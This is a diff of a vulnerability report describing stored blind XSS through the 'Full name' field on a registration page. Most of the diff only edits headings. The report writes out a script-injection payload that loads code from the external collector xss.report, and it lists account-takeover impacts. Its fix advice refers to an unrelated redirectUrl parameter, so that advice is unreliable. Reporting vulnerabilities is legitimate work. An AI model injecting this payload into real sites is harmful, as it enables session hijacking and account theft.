@@ -7,14 +7,14 @@
 
 Blind XSS
 
-## Summary : 
+## Summary  
 The "Full name" input field in the Create New Account  section does not sanitize or encode user-supplied input before storing it in the database and later rendering it back to users. This means any JavaScript payload entered as a report name gets saved and then executed in the browser of every authenticated user who visits the Reports page — not just the attacker.
 
 ## Vulnerable Endpoint
 http://kzlabs.com/63.php
 
 
-## Steps to Reproduce : 
+## Steps to Reproduce  
 
 1. Register for New Account at `https://kzlabs.com/60.php`.
 2. In the Full Name field and Company Name enter the following payload: `'"><script src=https://xss.report/c/xamoo></script>` ( Note payload is taken from website : https://xss.report/ . Notes create account here and take any payload from XSS Payload Section . then add it here implace of my payload because xss result will appear in XSS report section in this website)
@@ -37,9 +37,6 @@ https://github.com/user-attachments/assets/572dad72-23c1-44b6-ab02-e02f4df02d45
 
 
 
- 
-
-
 
 ## Impact
  
@@ -48,7 +45,7 @@ https://github.com/user-attachments/assets/572dad72-23c1-44b6-ab02-e02f4df02d45
  - Full account takeover without user interaction — hijack session, reset password, or link attacker’s OAuth
    
   
-## Recommendations for fix:
+## Recommendations for fix
 
  Validate and sanitize the redirectUrl parameter to ensure that it does not contain any malicious content. This can be done by:
 
